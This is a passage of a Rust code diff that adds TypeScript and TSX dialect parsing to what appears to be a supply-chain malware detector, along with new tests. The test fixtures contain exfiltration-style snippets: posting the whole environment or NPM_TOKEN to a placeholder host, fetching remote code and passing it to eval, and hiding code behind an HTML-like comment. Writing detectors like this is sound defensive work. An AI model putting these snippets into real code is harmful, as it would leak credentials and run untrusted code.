@@ -3970,16 +3970,76 @@ pub struct Facts {
 /// Why the tree said nothing about a text.
 #[derive(Clone, Debug, PartialEq)]
 pub enum Unread {
-    /// the parser refused it (JavaScript's reading, the first tried: its line and reason), and TypeScript's too
+    /// the parser refused it (its line and reason): in a TypeScript file's dialect, that reading's; otherwise
+    /// JavaScript's, the first tried, when TypeScript's refuses it too
     Refused(usize, PyStr),
     /// over MAX_FILE, or past the pass's budget
     Other,
 }
 
+/// The dialect the supply-chain tree reads a text in (TS-STRIP). `Js`: a JavaScript file's, or a text whose file is
+/// not known: JavaScript (with JSX and Flow's annotations) first, then TypeScript (without JSX), which the hosts
+/// handed as JavaScript. `Ts` (.ts, .mts, .cts) and `Tsx` (.tsx): a TypeScript file's, read in its own dialect
+/// alone, TypeScript without JSX and with it, as tsc reads it: `post<object>(process.env)` is a call given a type,
+/// where JavaScript reads `(post < object) > (process.env)`, and a .tsx file's `!`, `as` and generics are read where
+/// neither of the other two readings reads them.
+#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
+pub enum Dialect {
+    #[default]
+    Js,
+    Ts,
+    Tsx,
+}
+
+impl Dialect {
+    /// The dialect of a file name, by its extension (jsparse::dialect's, as js_loads reads it).
+    pub fn of_path(path: &[u32]) -> Dialect {
+        match crate::jsparse::dialect(path) {
+            (true, false) => Dialect::Ts,
+            (true, true) => Dialect::Tsx,
+            _ => Dialect::Js,
+        }
+    }
+
+    /// The API's `dialect` argument: "js", "ts" or "tsx" (None for any other).
+    pub fn of_name(name: &str) -> Option<Dialect> {
+        match name {
+            "js" => Some(Dialect::Js),
+            "ts" => Some(Dialect::Ts),
+            "tsx" => Some(Dialect::Tsx),
+            _ => None,
+        }
+    }
+}
+
 thread_local! {
-    /// The last text read and what the tree said (Err: why it could not
-    /// say): the tests ask for a text's send, then for its received code.
-    static LAST: std::cell::RefCell<Option<(Vec<u32>, Result<Rc<Facts>, Unread>)>> = const { std::cell::RefCell::new(None) };
+    /// The last text read, in its dialect, and what the tree said (Err: why it could not say): the tests ask for a
+    /// text's send, then for its received code. (One text in two dialects is two readings.)
+    static LAST: std::cell::RefCell<Option<(Dialect, Vec<u32>, Result<Rc<Facts>, Unread>)>> = const { std::cell::RefCell::new(None) };
+    /// the dialect of the text the call in progress reads (read_as): the API's `dialect`, a hook target's by its name
+    static DIALECT: std::cell::Cell<Dialect> = const { std::cell::Cell::new(Dialect::Js) };
+}
+
+/// Reads the texts the supply-chain tree is given in `dialect` until the guard is dropped (TS-STRIP: the API's
+/// `dialect`, for a call given a TypeScript file's text; a hook's target by its name), as own_release names the
+/// release (signs.rs). Without one, a text is read as JavaScript first, as before.
+pub fn read_as(dialect: Dialect) -> ReadAs {
+    ReadAs(DIALECT.with(|d| d.replace(dialect)))
+}
+
+/// read_as's guard: the dialect before it, put back when it is dropped.
+pub struct ReadAs(Dialect);
+
+impl Drop for ReadAs {
+    fn drop(&mut self) {
+        let before = self.0;
+        DIALECT.with(|d| d.set(before));
+    }
+}
+
+/// The dialect the call in progress reads its texts in (read_as).
+pub fn dialect() -> Dialect {
+    DIALECT.with(|d| d.get())
 }
 
 /// The tree's facts about a JavaScript text, or None when it could not say
@@ -3994,7 +4054,10 @@ fn facts_or_why(text: &[u32]) -> Result<Rc<Facts>, Unread> {
     if text.len() > MAX_FILE {
         return Err(Unread::Other);
     }
-    if let Some(hit) = LAST.with(|l| l.borrow().as_ref().filter(|(t, _)| t.as_slice() == text).map(|(_, f)| f.clone())) {
+    let dialect = dialect();
+    if let Some(hit) = LAST.with(|l| {
+        l.borrow().as_ref().filter(|(d, t, _)| *d == dialect && t.as_slice() == text).map(|(_, _, f)| f.clone())
+    }) {
         return hit;
     }
     let owned = text.to_vec();
@@ -4002,10 +4065,10 @@ fn facts_or_why(text: &[u32]) -> Result<Rc<Facts>, Unread> {
     let gate = crate::textgate::share(text);
     let got = crate::api::on_own_stack(move || {
         let _gate = gate.and_then(|g| crate::textgate::adopt(&owned, g));
-        facts_here(&owned)
+        facts_here(&owned, dialect)
     })
     .map(Rc::new);
-    LAST.with(|l| *l.borrow_mut() = Some((text.to_vec(), got.clone())));
+    LAST.with(|l| *l.borrow_mut() = Some((dialect, text.to_vec(), got.clone())));
     got
 }
 
@@ -4021,26 +4084,36 @@ pub fn refusal(text: &[u32]) -> Option<(usize, PyStr)> {
 }
 
 /// refusal() by the parse alone, without the model's reading: what a host asks of a text another test read on its
-/// tree (an install script's: the registry's `js_refusal`).
+/// tree (an install script's: the registry's `js_refusal`), in the dialect of the call (read_as).
 pub fn parse_refusal(text: &[u32]) -> Option<(usize, PyStr)> {
     if text.len() > MAX_FILE {
         return None;
     }
     let owned = text.to_vec();
-    crate::api::on_own_stack(move || supply_tree(&owned).err())
+    let dialect = dialect();
+    crate::api::on_own_stack(move || supply_tree(&owned, dialect).err())
 }
 
-/// The tree the model reads for a JavaScript text, or the parser's refusal of it (the JavaScript reading's line and
-/// reason, when TypeScript's refuses it too).
-fn supply_tree(text: &[u32]) -> Result<crate::jsparse::tree::Tree, (usize, PyStr)> {
+/// The tree the model reads for a JavaScript text, or the parser's refusal of it. A TypeScript file's (`Ts`, `Tsx`)
+/// is read in its own dialect alone, and a refusal is that reading's (TS-STRIP: read as JavaScript first, a .ts
+/// file's `f<T>(x)` was `(f < T) > (x)`, and a .tsx file's `!` and `as` were refused by both readings). Any other
+/// (`Js`): JavaScript's reading, then TypeScript's; a refusal is JavaScript's line and reason, when TypeScript's
+/// refuses it too.
+fn supply_tree(text: &[u32], dialect: Dialect) -> Result<crate::jsparse::tree::Tree, (usize, PyStr)> {
+    let own = |jsx: bool| crate::jsparse::parse(text, true, jsx).map_err(|e| (e.line as usize, e.reason));
+    match dialect {
+        Dialect::Ts => return own(false),
+        Dialect::Tsx => return own(true),
+        Dialect::Js => {}
+    }
     match crate::jsparse::parse_file(&u("script.js"), text) {
-        // (F-12: an HTML-like `<!--` after code, a comment to V8, is `<` `!` `--` to tsc, and a TypeScript file's
-        // text is read here as JavaScript first: what the comment hides may be code tsc runs. Then the text is read
-        // as tsc reads it, which sees that code, when that reading parses; when it does not, no runtime runs it
+        // (F-12: an HTML-like `<!--` after code, a comment to V8, is `<` `!` `--` to tsc, and a text whose file is
+        // not known is read here as JavaScript first: what the comment hides may be code tsc runs. Then the text is
+        // read as tsc reads it, which sees that code, when that reading parses; when it does not, no runtime runs it
         // so, and the comment's reading stands.)
         Ok(t) if t.html_after_code => Ok(crate::jsparse::parse_with(text, false, true, false).unwrap_or(t)),
         Ok(t) => Ok(t),
-        // (TypeScript, which the hosts hand as JavaScript)
+        // (TypeScript, which a host that does not say the file's dialect hands as JavaScript)
         Err(e) => crate::jsparse::parse_file(&u("script.ts"), text).map_err(|_| (e.line as usize, e.reason)),
     }
 }
@@ -4079,10 +4152,10 @@ pub fn rewrote(text: &[u32]) -> Option<Vec<(usize, PyStr)>> {
     facts(text).map(|f| f.rewrote.clone())
 }
 
-fn facts_here(text: &[u32]) -> Result<Facts, Unread> {
+fn facts_here(text: &[u32], dialect: Dialect) -> Result<Facts, Unread> {
     let pack = crate::pack::current();
     let path = u("script.js");
-    let tree = supply_tree(text).map_err(|(line, reason)| Unread::Refused(line, reason))?;
+    let tree = supply_tree(text, dialect).map_err(|(line, reason)| Unread::Refused(line, reason))?;
     let sup = Rc::new(Supply::new(pack, text));
     let mut cfg = Config::new(&[], &[], &[], &[]);
     cfg.supply = Some(sup.clone());
@@ -4150,7 +4223,7 @@ mod tests {
 
     fn sent(src: &str) -> Option<(&'static str, String, bool)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text).ok().map(|f| f.sent) {
+        match facts_here(&text, Dialect::Js).ok().map(|f| f.sent) {
             Some(Answer::Found(_at, kind, what, in_address)) => {
                 Some((kind, what.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect(), in_address))
             }
@@ -4166,7 +4239,7 @@ mod tests {
     /// The category of a text's first received code, if any.
     fn runs(src: &str) -> Option<&'static str> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text).ok() {
+        match facts_here(&text, Dialect::Js).ok() {
             Some(f) => f.received.map(|(_, cat)| cat),
             None => panic!("not read: {}", src),
         }
@@ -4212,6 +4285,118 @@ mod tests {
         }
         let text: Vec<u32> = "a = 1;\nconst = 1;\n".chars().map(|c| c as u32).collect();
         assert_eq!(parse_refusal(&text), Some((2, u("unexpected token '='"))));
+    }
+
+    fn cps(src: &str) -> Vec<u32> {
+        src.chars().map(|c| c as u32).collect()
+    }
+
+    /// The parser's refusal of a text in a dialect, by the parse alone (js_refusal's) and by the model's (refusal()).
+    fn refused_in(src: &str, dialect: Dialect) -> Option<(usize, PyStr)> {
+        let text = cps(src);
+        let _read = read_as(dialect);
+        let alone = parse_refusal(&text);
+        assert_eq!(alone, refusal(&text), "{}", src);
+        alone
+    }
+
+    #[test]
+    fn a_tsx_file_is_read_as_typescript_with_jsx() {
+        // (TS-STRIP) TypeScript's syntax in a file with JSX: JavaScript's reading (JSX, Flow) refused it, and so did
+        // TypeScript's without JSX; a .tsx file is now read in its own dialect. The first: Vite's stock main.tsx.
+        let jsx = "\nexport const el = <div className=\"x\">hi</div>;\n";
+        let main = "import React from 'react'\nimport ReactDOM from 'react-dom/client'\nimport App from './App.tsx'\n\
+                    ReactDOM.createRoot(document.getElementById('root')!).render(\n  <React.StrictMode>\n    <App />\n  \
+                    </React.StrictMode>,\n)\n";
+        let mut srcs = vec![main.to_string(), "export const el = <List<string> items={[]} />;\n".to_string()];
+        for ts in [
+            "const x = (window as any).foo;",
+            "const c = { a: 1 } satisfies Record<string, number>;",
+            "const id = <T,>(x: T): T => x;",
+            "const id = <T extends object>(x: T) => x;",
+            "enum Color { Red, Green }",
+            "namespace NS { export const a = 1; }",
+            "declare module 'foo' { export const a: number; }",
+            "declare global { interface Window { x: number } }",
+            "function f(a: string): string;\nfunction f(a: number): number;\nfunction f(a: any) { return a; }",
+            "let x!: number;",
+            "class A { x!: number }",
+            "class A { [k: string]: unknown }",
+            "const [xs, setXs] = useState<number[]>([]);",
+            "const m = new Map<string, number>();",
+            "const r = a?.b<string>();",
+        ] {
+            srcs.push(format!("{}{}", ts, jsx));
+        }
+        for src in &srcs {
+            assert!(refused_in(src, Dialect::Js).is_some(), "{}", src);
+            assert_eq!(refused_in(src, Dialect::Tsx), None, "{}", src);
+        }
+    }
+
+    #[test]
+    fn a_typescript_file_is_read_in_its_dialect_alone() {
+        // (TS-STRIP) read as JavaScript first, a .ts file's call given a type is `(post < object) > (…)`: no call, no
+        // send, and no refusal either. In its dialect it is the call tsc compiles.
+        let send = |prefix: &str| {
+            format!("import axios from 'axios';\nconst v = JSON.stringify(process.env);\naxios.post{}('https://{}/c', v);\n", prefix, HOST)
+        };
+        let whole = Some(Answer::Found(0, "environment", u("the whole environment"), false));
+        let kind = |src: &str, dialect: Dialect| {
+            let _read = read_as(dialect);
+            match facts(&cps(src)).map(|f| f.sent.clone()) {
+                Some(Answer::Found(_, kind, what, weak)) => Some(Answer::Found(0, kind, what, weak)),
+                other => other,
+            }
+        };
+        assert_eq!(kind(&send(""), Dialect::Js), whole);
+        assert_eq!(kind(&send(""), Dialect::Ts), whole);
+        assert_eq!(kind(&send("<Resp>"), Dialect::Js), Some(Answer::Nothing));
+        assert_eq!(kind(&send("<Resp>"), Dialect::Ts), whole);
+        assert_eq!(kind(&send("<Resp>"), Dialect::Tsx), whole);
+        // received code, through a function of the file's given a type
+        let got = |dialect: Dialect, src: &str| {
+            let _read = read_as(dialect);
+            received_code(&cps(src)).map(|r| r.map(|(_, cat)| cat))
+        };
+        let run = format!(
+            "function getJSON<T>(u: string) {{ return fetch(u).then((r) => r.text()); }}\ngetJSON<string>('https://{}/p').then(eval);\n",
+            HOST
+        );
+        assert_eq!(got(Dialect::Js, &run), Some(None));
+        assert_eq!(got(Dialect::Ts, &run), Some(Some("run")));
+        // a refusal is the dialect's own: JSX is no TypeScript in a .ts file (`<T>x` is a type assertion there)
+        let jsx = "const a = 1;\nexport const el = <div>hi</div>;\n";
+        assert_eq!(refused_in(jsx, Dialect::Js), None);
+        assert_eq!(refused_in(jsx, Dialect::Tsx), None);
+        assert!(refused_in(jsx, Dialect::Ts).is_some_and(|(line, _)| line == 2));
+        // and an HTML-like comment is `<` `!` `--`, as tsc reads it: what follows it is code
+        let html = format!("const v = process.env.NPM_TOKEN;\n<!-- a note\nfetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
+        assert!(refused_in(&html, Dialect::Ts).is_some());
+        assert_eq!(refused_in(&html, Dialect::Js), None);
+    }
+
+    #[test]
+    fn the_dialect_is_the_files_and_the_cache_keeps_them_apart() {
+        assert_eq!(Dialect::of_path(&u("src/a.ts")), Dialect::Ts);
+        assert_eq!(Dialect::of_path(&u("a.MTS")), Dialect::Ts);
+        assert_eq!(Dialect::of_path(&u("a.cts")), Dialect::Ts);
+        assert_eq!(Dialect::of_path(&u("App.tsx")), Dialect::Tsx);
+        for js in ["a.js", "a.mjs", "a.cjs", "a.jsx", "bin/cli", ""] {
+            assert_eq!(Dialect::of_path(&u(js)), Dialect::Js, "{}", js);
+        }
+        assert_eq!(Dialect::of_name("tsx"), Some(Dialect::Tsx));
+        assert_eq!(Dialect::of_name("TS"), None);
+        // one text, asked in one dialect then in another, is read in each (facts' cache is keyed by the dialect)
+        let text = cps(&format!("const v = process.env.NPM_TOKEN;\nsend<object>('https://{}/c', v);\nfunction send(u, b) {{ fetch(u, {{ method: 'POST', body: b }}); }}\n", HOST));
+        let ts = {
+            let _read = read_as(Dialect::Ts);
+            assert_eq!(dialect(), Dialect::Ts);
+            local_data_sent(&text)
+        };
+        assert_eq!(dialect(), Dialect::Js);
+        assert!(matches!(ts, Answer::Found(_, "environment", _, _)), "{:?}", ts);
+        assert_eq!(local_data_sent(&text), Answer::Nothing);
     }
 
     #[test]
@@ -4885,7 +5070,7 @@ mod tests {
     fn decoded(src: &str) -> Vec<(usize, usize)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
         let line = |at: usize| text[..at.min(text.len())].iter().filter(|&&c| c == 0x0A).count() + 1;
-        match facts_here(&text).ok() {
+        match facts_here(&text, Dialect::Js).ok() {
             Some(f) => f.decoded.iter().map(|&(at, from)| (line(at), line(from))).collect(),
             None => panic!("not read: {}", src),
         }
@@ -4925,7 +5110,7 @@ mod tests {
 
     fn dropped(src: &str) -> Option<(usize, u16, String, Option<String>)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text).ok() {
+        match facts_here(&text, Dialect::Js).ok() {
             Some(f) => f.dropped.map(|d| (d.line, d.kinds, pystr::to_string(&d.what), d.interp.map(|i| pystr::to_string(&i)))),
             None => panic!("not read: {}", src),
         }
@@ -4970,7 +5155,7 @@ mod tests {
         // D-9b: out of the script's own folder to a scoped package's
         let rewrote = |src: &str| -> Vec<(usize, String)> {
             let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-            facts_here(&text).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
+            facts_here(&text, Dialect::Js).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
         };
         for dir in ["__dirname", "path.dirname(__filename)"] {
             let src = format!(
@@ -5001,7 +5186,7 @@ mod tests {
         // path joined from node_modules, its code file written with the script's own text
         let rewrote = |src: &str| -> Vec<(usize, String)> {
             let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-            facts_here(&text).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
+            facts_here(&text, Dialect::Js).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
         };
         let src = "const fs = require('fs');\nconst path = require('path');\nfunction findTarget() {\n  \
                    const possible = [path.join(process.cwd(), 'node_modules', '@whiskeysockets', 'baileys')];\n  \
